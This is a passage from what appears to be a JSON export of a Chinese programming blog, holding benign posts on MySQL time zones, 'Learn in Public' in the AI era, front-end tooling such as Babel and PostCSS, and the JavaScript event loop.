class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e----+----------------+---------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_name\u003c/span\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_timestamp\u003c/span\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eevent_datetime\u003c/span\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e----+----------------+---------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e03\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e夏令时，相差\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e小时\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e02\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2022\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e24\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e45\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e平时相差\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e小时\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e----+----------------+---------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003erows\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ein\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eset\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e00\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003esec\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e纽约 UTC 时差通常为 UTC-5（EST），夏令时为 UTC-4（EDT），所以将原本的会话从上海(UTC+8) 转到纽约时，\u003ccode\u003eTIMESTAMP\u003c/code\u003e 相差了 13 或 12(夏令时) 小时，所以为了自动转换夏令时，指定时区最好使用时区名词 \u003ccode\u003eAsia/Shanghai\u003c/code\u003e，避免使用偏移量：\u003ccode\u003e'+08:00'\u003c/code\u003e\u003c/p\u003e","title":"MySQL 时区与 serverTimezone"},{"content":"TL;DR Learn in Public 强调将学习到的知识 分享到公共空间，相较于纯输入式的学习有诸多好处。AI 工具极大降低了信息检索、整理、概括的门槛，使得输入信息更容易，但对我们真正掌握知识的帮助仍然有限，所以我们更需践行要像 Learn in Public 这样能提供 有效输出 的学习方式\nAI 工具大大降低了信息检索、整理和概括的门槛，使得获取信息更加便捷，但对我们真正掌握知识的帮助仍然有限。因此我们更需要践行像 Learn in Public 这样重视 有效输出 的学习方式\n为什么会想到这个话题 偶然间看到 Owen 发的贴子：\n看到一个说法：笔记是一种无限游戏，没有结果，只有过程；而博客是一种有限游戏，因为它产出了完成的作品：博文。这说明我们不能当一个完美主义者，只在脑海或草稿箱中保留想法，我们应该尽可能完成作品，公开它，然后不断的练习这个过程。\n我更坚定那个想法了：做一个默认设计为公开的笔记软件\n看到这个贴子，马上联想到了 Learn in Public 这个概念，开始思考自己的这些年记笔记的方式，意识到了原来的方式可能存在一些问题，于是开始尝试践行 Learn in Public，将自己学习的一些东西写成博客、用学到的知识做一个有意义的产品等等。经过了这段时间的实践，再结合上自己日常使用 AI 的一些感受和想法，很自然地就想到了这个话题\n什么是 Learn In Public 在 swyx 发布 Learn In Public 后，这个概念变得更加流行。Learn in Public 强调的是 将学到的东西分享到公共空间\n常见的 Learn In Public 的方式，例如：\n撰写博客、教程 在会议上发言 在问答社区提问或者回答 制作并发布视频 与之相对的 Learn in Private 侧重的是 消费内容，例如：\n个人笔记 阅读书籍 阅读源码 订阅 GitHub 的 Repos 和 Issues，观察其他的人实践 为什么需要 Learn in Public Learn in Public 是一个输出的过程，促进知识的整理、理解、求证，帮助我们拓宽对某些 知识理解的边界 公共空间能提供 反馈，反馈可以产生激励、也可以修正我们努力的方向 有助于 筛选 所要学习的东西，Learn In Public 会花费大量精力，它能促使我们评估即将学习的内容是否值得 对抗完美主义，先有产出，走出第一步再根据反馈 持续迭代，而不是止步不前 很多的知识都来自 Public ，所以没有什么好藏着掖着，大部分的成果可能都是站在巨人的肩膀上 为什么 AI 时代更应该 Learn in Public 在 AI 的推动下，知识获取已经实现了质的飞跃，但对我们真正掌握知识的帮助仍然有限，所以我们更应该 Learn in Public，做更多的 有效输出\nAI 时代信息检索、整理、概括成本急剧下降，机械式学习 或者是 誊抄式地摘抄笔记 在变得更加没有意义。在 GPT 兴起之前，使用的优秀的搜索引擎、完全使用英文搜索技术问题、阅读官方文档，这些都被视为一种能力，如今众多的 AI 工具已经极大缩小这些差距。ChatGPT 或是 devv.ai 这类 AI 工具都提升了检索效率，在 AI 的加持下 沉浸式翻译 这类的插件提高了外文阅读的效率，解决普遍问题正在变得越来越容易\n一些知识技术迭代快，在时效性上一些 摘抄笔记 不如 检索增强生成（Retrieval Augmented Generation）的 AI提供的实时内容。我曾经也沉迷在各种笔记工具，复制粘贴，忽略了思考，随着知识的更新迭代，这些笔记开始慢慢腐烂，变得食之无味弃之可惜，最后自己都不想看\n目前的 AI 还不具备实践或跨流程解决问题的能力，事物之间的衔接仍需我们来完成，实践和深度地分析解决问题的价值更加凸显\n一些思路分享 利用好 AI 工具：AI 生成的内容可能在准确性、时效性、效率上要优于常规方式检索。我们可以用 AI 快速了解一些知识的轮廓，也可以在 AI 的辅助下更深入地学习某些 有价值 的东西 将学习到的知识 分享到公共空间，可以设定一个小目标，比如：针对某个知识点写出比 AI 生成内容更高质量的博客 用公开的博客代替私有化的笔记，用反复地思考推敲 代替 随意地复制粘贴引用 以项目或者是作品驱动，直接开始做，用好 AI 工具，边学边做 参考资料 Learn In Public How To Learn In Private 怎么做，能30天内学会任何技能？ 10 Things Software Developers Should Learn about Learning\n","permalink":"https://aaronlinv.github.io/posts/%E4%B8%BA%E4%BB%80%E4%B9%88-ai-%E6%97%B6%E4%BB%A3%E6%9B%B4%E5%BA%94%E8%AF%A5-learn-in-public/","summary":"\u003ch2 id=\"tldr\"\u003eTL;DR\u003c/h2\u003e\n\u003cp\u003eLearn in Public 强调将学习到的知识 \u003cstrong\u003e分享到公共空间\u003c/strong\u003e，相较于纯输入式的学习有诸多好处。AI 工具极大降低了信息检索、整理、概括的门槛，使得输入信息更容易，但对我们真正掌握知识的帮助仍然有限，所以我们更需践行要像 Learn in Public 这样能提供 \u003cstrong\u003e有效输出\u003c/strong\u003e 的学习方式\u003c/p\u003e\n\u003cp\u003eAI 工具大大降低了信息检索、整理和概括的门槛，使得获取信息更加便捷，但对我们真正掌握知识的帮助仍然有限。因此我们更需要践行像 Learn in Public 这样重视 \u003cstrong\u003e有效输出\u003c/strong\u003e 的学习方式\u003c/p\u003e\n\u003ch2 id=\"为什么会想到这个话题\"\u003e为什么会想到这个话题\u003c/h2\u003e\n\u003cp\u003e偶然间看到 \u003ca href=\"https://twitter.com/OwenYoungZh/status/1775977873301713157\"\u003eOwen\u003c/a\u003e 发的贴子：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e看到一个说法：笔记是一种无限游戏，没有结果，只有过程；而博客是一种有限游戏，因为它产出了完成的作品：博文。这说明我们不能当一个完美主义者，只在脑海或草稿箱中保留想法，我们应该尽可能完成作品，公开它，然后不断的练习这个过程。\u003c/p\u003e\n\u003cp\u003e我更坚定那个想法了：做一个默认设计为公开的笔记软件\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e看到这个贴子，马上联想到了 \u003cstrong\u003eLearn in Public\u003c/strong\u003e 这个概念，开始思考自己的这些年记笔记的方式，意识到了原来的方式可能存在一些问题，于是开始尝试践行 Learn in Public，将自己学习的一些东西写成博客、用学到的知识做一个有意义的产品等等。经过了这段时间的实践，再结合上自己日常使用 AI 的一些感受和想法，很自然地就想到了这个话题\u003c/p\u003e\n\u003ch2 id=\"什么是-learn-in-public\"\u003e什么是 Learn In Public\u003c/h2\u003e\n\u003cp\u003e在 swyx 发布 \u003ca href=\"https://www.swyx.io/learn-in-public\"\u003eLearn In Public\u003c/a\u003e 后，这个概念变得更加流行。Learn in Public 强调的是 \u003cstrong\u003e将学到的东西分享到公共空间\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e常见的 Learn In Public 的方式，例如：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e撰写博客、教程\u003c/li\u003e\n\u003cli\u003e在会议上发言\u003c/li\u003e\n\u003cli\u003e在问答社区提问或者回答\u003c/li\u003e\n\u003cli\u003e制作并发布视频\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e与之相对的 Learn in Private 侧重的是 \u003cstrong\u003e消费内容\u003c/strong\u003e，例如：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e个人笔记\u003c/li\u003e\n\u003cli\u003e阅读书籍\u003c/li\u003e\n\u003cli\u003e阅读源码\u003c/li\u003e\n\u003cli\u003e订阅 GitHub 的 Repos 和 Issues，观察其他的人实践\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"为什么需要-learn-in-public\"\u003e为什么需要 Learn in Public\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eLearn in Public 是一个输出的过程，促进知识的整理、理解、求证，帮助我们拓宽对某些 \u003cstrong\u003e知识理解的边界\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e公共空间能提供 \u003cstrong\u003e反馈\u003c/strong\u003e，反馈可以产生激励、也可以修正我们努力的方向\u003c/li\u003e\n\u003cli\u003e有助于 \u003cstrong\u003e筛选\u003c/strong\u003e 所要学习的东西，Learn In Public 会花费大量精力，它能促使我们评估即将学习的内容是否值得\u003c/li\u003e\n\u003cli\u003e对抗完美主义，先有产出，走出第一步再根据反馈 \u003cstrong\u003e持续迭代\u003c/strong\u003e，而不是止步不前\u003c/li\u003e\n\u003cli\u003e很多的知识都来自 Public ，所以没有什么好藏着掖着，大部分的成果可能都是站在巨人的肩膀上\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"为什么-ai-时代更应该-learn-in-public\"\u003e为什么 AI 时代更应该 Learn in Public\u003c/h2\u003e\n\u003cp\u003e在 AI 的推动下，知识获取已经实现了质的飞跃，但对我们真正掌握知识的帮助仍然有限，所以我们更应该 Learn in Public，做更多的 \u003cstrong\u003e有效输出\u003c/strong\u003e\u003c/p\u003e","title":"为什么 AI 时代更应该 Learn in Public"},{"content":"最初对前端的观感：眼花缭乱，各种各样的工具链以及其对应的配置文件、VS Code 插件，各种技术百家争鸣，选择众多。后来才理解前端不同于后端，后端代码的运行环境相对可控，而前端代码运行在用户设备上，所以需要兼容不同的环境，而很大一部分的工具、配置都是解决兼容性的问题\nTL;DR 工程化的目的：降低开发成本提高开发效率 方式：解决前端三大件（HTML, CSS, JS）存在的问题并对其进行增强，JS 通过 Babel 而 CSS 可以通过 Sass, Less, PostCSS 等工具实现进行增强，并且保证输出向后兼容的的 JS 或 CSS 代码\n模块化、包管理 分解聚合：拆分复杂任务，降低复杂度（分而治之）\n模块化解决 问题：1. 全局污染 2. 依赖管理 等等 JS 模块化标准（常用）：1. CommonJS （Node 标准）2. ES modules（JavaScript 官方标准模块化方案） 实现：1. 浏览器只支持 ESM 2. Node 和 构建工具 上面两种标准都支持\n包 (package) 管理：npm（Node.js的标准包管理器），还有其他的 pnpm 和 yarn 等\nJS 工具链 JS 语言本身一直都在繁荣地发展，经常出现新的 API 和 语言特性，但是用户的运行环境（浏览器、Node等）的版本可能是五花八门的，可能会导致报错、兼容性等的问题，所以最朴素的解决方式就是把 JS 都转换为向后兼容的老版本 JS 代码。前端的运行环境更多的是在用户这边，这点不同于后端能比较自由地调整服务器运行环境，这可能就是前端缝缝补补的原因吧，修补主要有的方式：\n新 API：使用 Polyfill（填充物），为其实现缺少的 API，例如 core-js 库，就实现了 Array 的 flatMap 方法，这样在旧版本的 Node 环境，也可使用该方法 新语法：例如 Promise，对于这样的语法糖，就无法直接为其编写方法，需要转换代码，有点类似翻译，通过 regenerator 库可以将含有 Promise 的代码转换为向后兼容的代码 有很多这样的库用于解决某个特定的兼容性问题，一个个导入很麻烦，所以就有了 Babel，可以通过 Babel 的插件整合这些转换代码的库，需要安装对应的 Babel 插件依赖 并在 babel.config.js 中配置 plugins。这样还是很麻烦，所以我们可以直接使用 Babel 的预设，其中最常用的就是：@babel/preset-env，安装依赖以后完成以下的 babel.config.js 配置，即可开箱即用：\n// common js module.exports = { presets: [ // 预设名称 \u0026amp; 配置 [\u0026#39;@babel/preset-env\u0026#39;, { targets: { edge: \u0026#39;17\u0026#39;, firefox: \u0026#39;60\u0026#39;, chrome: \u0026#39;67\u0026#39;, safari: \u0026#39;11.1\u0026#39; }, // 按需导入 polyfill，未使用的 API 不导入 useBuiltIns: \u0026#39;usage\u0026#39;, corejs: \u0026#39;3.37.0\u0026#39;, }] ] // 插件的配置方式 // plugins: [ // \u0026#39;@babel/plugin-transform-optional-chaining\u0026#39; // ] } 有了这种思维之后，就可以通过 转换代码 的方式任意地增强 JS 的能力，就像：JSX 和 TypeScript ，它们最终还是会被编译为纯 JS 代码\nCSS 工具链 CSS 语法缺失（逻辑、函数等等），无法进行复杂的操作，所以就有了 CSS 预编译器：Less, Sass 等等的，与 JS 的处理方式一样，可以通过工具对其进行转换，转换为最朴素的 CSS，这样就没有兼容性的问题。解决了兼容性问题还需要解决 CSS 本身的问题：\n浏览器前缀 ( vendor prefixes )：类似 -webkit- 开头的样式 ，可以通过 autoprefixer 来自动添加浏览器前缀以确保网页在不同浏览器中的兼容性 压缩：减少 CSS 文件的大小，从而提高网页加载速度，相关的库 cssnano 剪枝：移除没有用到的 CSS，相关的库：purgecss 类名冲突：通过 css module 来实现，相关的库：postcss-modules 与处理 JS 的 Babel 类似，CSS 也有工具整合了上面这些工具，它就是PostCSS，安装需要的 依赖后，还需要配置 postcss.config.js。与 Babel 类似，它也可以开箱即用，需要安装依赖并配置 postcss-preset-env\nmodule.exports = { map: false, plugins: { tailwindcss: {}, \u0026#39;postcss-preset-env\u0026#39;: {}, }, }; 构建工具和脚手架 开发和运行的代码不一致，开发阶段我们希望工程代码可以方便地开发维护，而在对于生产运行的代码，我们则希望它兼容性强、文件小、加载快等等。这中间就需要打包工具来进行转换，常用的打包工具有：webpack，它的主要作用：\n模块化管理：使得项目结构清晰、依赖关系明确 打包编译：将各个模块按照其依赖关系进行打包编译，将它们转换为浏览器可识别的静态资源文件 资源优化：压缩 JavaScript、CSS、图片等文件，以减小文件体积，提高加载速度 代码分割：实现按需加载，提高页面加载性能 开发服务器：自动编译并运行服务（热更新），便于开发 Source Map：存储了编译后代码与源代码之间的映射关系，便于调试代码 与 Babel 和 PostCSS 相似，一旦有很多细碎的东西出现，就必然有工具可以进行整合并提供预设，对于整个代码工程来说，它就是脚手架：vue-cli, vite 等等，提供了交互式的界面辅助生成工程模版\n参考资料 ECMAScript 6 入门 - 阮一峰 工程化大师课 What is @babel/preset-env and why do I need it? postcss 结合 tailwindcss 前端技术的十八年风雨（2006-2024）\n","permalink":"https://aaronlinv.github.io/posts/%E7%90%86%E8%A7%A3%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/","summary":"\u003cp\u003e最初对前端的观感：眼花缭乱，各种各样的工具链以及其对应的配置文件、VS Code 插件，各种技术百家争鸣，选择众多。后来才理解前端不同于后端，后端代码的运行环境相对可控，而前端代码运行在用户设备上，所以需要兼容不同的环境，而很大一部分的工具、配置都是解决兼容性的问题\u003c/p\u003e\n\u003ch2 id=\"tldr\"\u003eTL;DR\u003c/h2\u003e\n\u003cp\u003e工程化的目的：降低开发成本提高开发效率\n方式：解决前端三大件（HTML, CSS, JS）存在的问题并对其进行增强，JS 通过 \u003ccode\u003eBabel\u003c/code\u003e 而 CSS 可以通过 \u003ccode\u003eSass\u003c/code\u003e, \u003ccode\u003eLess\u003c/code\u003e, \u003ccode\u003ePostCSS\u003c/code\u003e  等工具实现进行增强，并且保证输出向后兼容的的 JS 或 CSS 代码\u003c/p\u003e\n\u003ch2 id=\"模块化包管理\"\u003e模块化、包管理\u003c/h2\u003e\n\u003cp\u003e分解聚合：拆分复杂任务，降低复杂度（分而治之）\u003c/p\u003e\n\u003cp\u003e模块化解决 \u003cstrong\u003e问题\u003c/strong\u003e：1. 全局污染 2. 依赖管理 等等\nJS 模块化\u003cstrong\u003e标准\u003c/strong\u003e（常用）：1. \u003ccode\u003eCommonJS\u003c/code\u003e （Node 标准）2. \u003ccode\u003eES modules\u003c/code\u003e（JavaScript 官方标准模块化方案）\n\u003cstrong\u003e实现\u003c/strong\u003e：1. 浏览器只支持 ESM 2. Node 和 构建工具 上面两种标准都支持\u003c/p\u003e\n\u003cp\u003e包 (package) 管理：npm（Node.js的标准包管理器），还有其他的 pnpm 和 yarn 等\u003c/p\u003e\n\u003ch2 id=\"js-工具链\"\u003eJS 工具链\u003c/h2\u003e\n\u003cp\u003eJS 语言本身一直都在繁荣地发展，经常出现新的 API 和 语言特性，但是用户的运行环境（浏览器、Node等）的版本可能是五花八门的，可能会导致报错、兼容性等的问题，所以最朴素的解决方式就是把 JS 都\u003cstrong\u003e转换\u003c/strong\u003e为向后兼容的老版本 JS 代码。前端的运行环境更多的是在\u003cstrong\u003e用户\u003c/strong\u003e这边，这点不同于后端能比较自由地调整服务器运行环境，这可能就是前端缝缝补补的原因吧，修补主要有的方式：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e新 API：使用 Polyfill（填充物），为其实现缺少的 API，例如 \u003ccode\u003ecore-js\u003c/code\u003e 库，就实现了 \u003ccode\u003eArray\u003c/code\u003e 的 \u003ccode\u003eflatMap\u003c/code\u003e 方法，这样在旧版本的 Node 环境，也可使用该方法\u003c/li\u003e\n\u003cli\u003e新语法：例如 \u003ccode\u003ePromise\u003c/code\u003e，对于这样的语法糖，就无法直接为其编写方法，需要转换代码，有点类似翻译，通过 \u003ccode\u003eregenerator\u003c/code\u003e 库可以将含有 \u003ccode\u003ePromise\u003c/code\u003e 的代码转换为向后兼容的代码\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e有很多这样的库用于解决某个特定的兼容性问题，一个个导入很麻烦，所以就有了 \u003ca href=\"https://es6.ruanyifeng.com/#docs/intro#Babel-%E8%BD%AC%E7%A0%81%E5%99%A8\"\u003eBabel\u003c/a\u003e，可以通过 \u003ccode\u003eBabel\u003c/code\u003e 的插件整合这些转换代码的库，需要安装对应的 \u003ccode\u003eBabel\u003c/code\u003e 插件依赖 并在 \u003ccode\u003ebabel.config.js\u003c/code\u003e 中配置 \u003ccode\u003eplugins\u003c/code\u003e。这样还是很麻烦，所以我们可以直接使用 \u003ccode\u003eBabel\u003c/code\u003e 的预设，其中最常用的就是：\u003ccode\u003e@babel/preset-env\u003c/code\u003e，安装依赖以后完成以下的 \u003ccode\u003ebabel.config.js\u003c/code\u003e 配置，即可开箱即用：\u003c/p\u003e","title":"理解前端工程化"},{"content":"在前端代码中很经常看到使用 setTimeout(fn, 0)，如下面代码所示，乍一看很多余，但是移除了可能会出现一些奇奇怪怪的问题。要解释这个就需要理解 事件循环（Event Loop），下面会通过一些例子和动画来辅助理解事件循环\nsetTimeout(() =\u0026gt; { // 调用一些方法 }, 0) 为什么使用事件循环 JS 是单线程的（浏览器和 Node则是多线程的），为了避免 渲染主线程 阻塞，需要异步，事件循环 是异步的实现方式\n浏览器在一个渲染主线程中运行一个页面中的所有 JavaScript 脚本，以及呈现布局，回流，和垃圾回收。为了避免 同步 的执行方式导致渲染主线程阻塞，使得页面卡死，所以浏览器采用异步的方式：渲染主线程将任务交给其他线程去处理，自身 立即结束 任务的执行，转而执行后续代码，当其他线程完成时，将事先传递的回调函数包装成任务，加入到对应的消息队列的末尾排队，等待渲染主线程调度执行\n流程：\n渲染主线程执行全局 JS，需要异步的任务放到对应的队列，如果是 setTimeout 则会有线程计时，到了指定时间会将任务放入 延时队列（并非立即执行） 渲染主线程为空时，按队列的优先级依次选择队列（最先执行微队列的任务），依次按顺序执行各个队列的任务 任务没有优先级，而消息队列有优先级，不同任务分属于不同队列：参考 W3C 规范。微队列优先级最高，接着是交互队列然后才是延时队列\n常见队列：\n微队列（microtask）：⽤户存放需要最快执⾏的任务，优先级「最⾼」，通过 Promise.resolve().then() ⽴即把⼀个函数添加到微队列 交互队列：⽤于存放⽤户操作后产⽣的事件处理任务，优先级「⾼」 延时队列：⽤于存放计时器到达后的回调任务，优先级「中」 事件循环 下面例子来自于：《WEB前端大师课》，大块的文字描述相对没那么直观，所以用 Keynote 做了 gif 方便理解（如果有更好的做 gif 的方式可以留言告诉我）\n1. JS阻碍页面渲染 JS 修改了 DOM 后，并不会马上显示在页面上，需要进行 绘制 后才会显示页面变更\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;初始h1\u0026lt;/h1\u0026gt; \u0026lt;button\u0026gt;change\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; var h1 = document.querySelector(\u0026#39;h1\u0026#39;); var btn = document.querySelector(\u0026#39;button\u0026#39;); function delay(duration) { var start = Date.now(); while (Date.now() - start \u0026lt; duration) {} } btn.onclick = function () { h1.textContent = \u0026#39;修改h1 textContent\u0026#39;; delay(3000); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 效果：点击 change 后，页面卡死，3s 后 h1 内容变更为：修改h1 textContent\n2. 延迟队列 setTimeout 